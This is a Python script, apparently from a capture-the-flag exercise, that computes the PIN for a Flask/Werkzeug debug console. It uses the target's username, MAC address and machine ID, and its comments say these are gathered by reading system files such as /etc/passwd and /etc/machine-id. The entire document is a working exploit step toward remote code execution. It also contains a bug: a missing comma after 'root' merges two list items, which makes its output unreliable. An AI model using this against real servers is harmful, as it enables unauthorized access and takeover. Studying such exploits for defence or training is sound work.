import hashlib
from itertools import chain

probably_public_bits = [
    'root'  # username，通过/etc/passwd
    'flask.app',  # modname，默认值
    'Flask',  # 默认值
    '/usr/local/lib/python3.10/site-packages/flask/app.py'
]

private_bits = [
    '196243615804531',  # mac十进制值 /sys/class/net/eth0/address
    '867ab5d2-4e57-4335-811b-2943c662e936docker-ff7154af9646a1f8c21f1ccfb488542a9becef4411a1a2628f63370a1a64fd17.scope'
    # machine_id由三个合并(docker就后两个)：1./etc/machine-id 2./proc/sys/kernel/random/boot_id 3./proc/self/cgroup
]

h = hashlib.sha1()
for bit in chain(probably_public_bits, private_bits):
    if not bit:
        continue
    if isinstance(bit, str):
        bit = bit.encode('utf-8')
    h.update(bit)
h.update(b'cookiesalt')

cookie_name = '__wzd' + h.hexdigest()[:20]

num = None
if num is None:
    h.update(b'pinsalt')
    num = ('%09d' % int(h.hexdigest(), 16))[:9]

rv = None
if rv is None:
    for group_size in 5, 4, 3:
        if len(num) % group_size == 0:
            rv = '-'.join(num[x:x + group_size].rjust(group_size, '0')
                          for x in range(0, len(num), group_size))
            break
    else:
        rv = num

print(rv)
